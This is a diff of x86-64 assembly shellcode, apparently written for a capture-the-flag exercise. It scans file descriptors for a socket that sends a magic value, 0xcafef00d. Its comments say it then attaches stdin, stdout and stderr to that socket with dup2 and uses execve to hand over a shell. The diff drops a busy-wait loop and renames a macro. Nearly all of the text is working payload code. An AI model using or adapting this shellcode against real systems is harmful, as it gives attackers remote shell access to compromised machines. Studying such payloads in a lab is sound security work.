@@ -4,24 +4,13 @@
 	;; RDI, RSI, RDX, RCX, R8, and R9 then stack		
 	;; read = 0, dup2 = 33, execve = 59
 
-	%define magic dword 0xcafef00d
+	%define MAGIC dword 0xcafef00d
 BITS 64
 global main
 
 	section .mytext progbits alloc exec write
 
-main:	
-	xor rax,rax
-oursleep:
-	inc eax 
-	jno oursleep
-oursleep2:
-	inc eax 
-	jno oursleep2
-	;;this will busywait for about 1.5-2s
-	;; if we use a blocking read do we need to wait?
-	
-
+main:
 	xor rdi,rdi
 	mov dil,20		;adjust for the popularity of the ctf
 	;; dil is the starting fd to read from, we try each in decending order
@@ -39,7 +28,7 @@ ourread:
 	syscall		     	;read rax=0
 	cmp al,4
 	jnz ourread
-	cmp [rsi], magic ;this is our magic number %defined on top
+	cmp [rsi], MAGIC ;this is our magic number %defined on top
 	jnz ourread
 
 	;; this dup2 code attaches stdin stdout and stderr to our socket
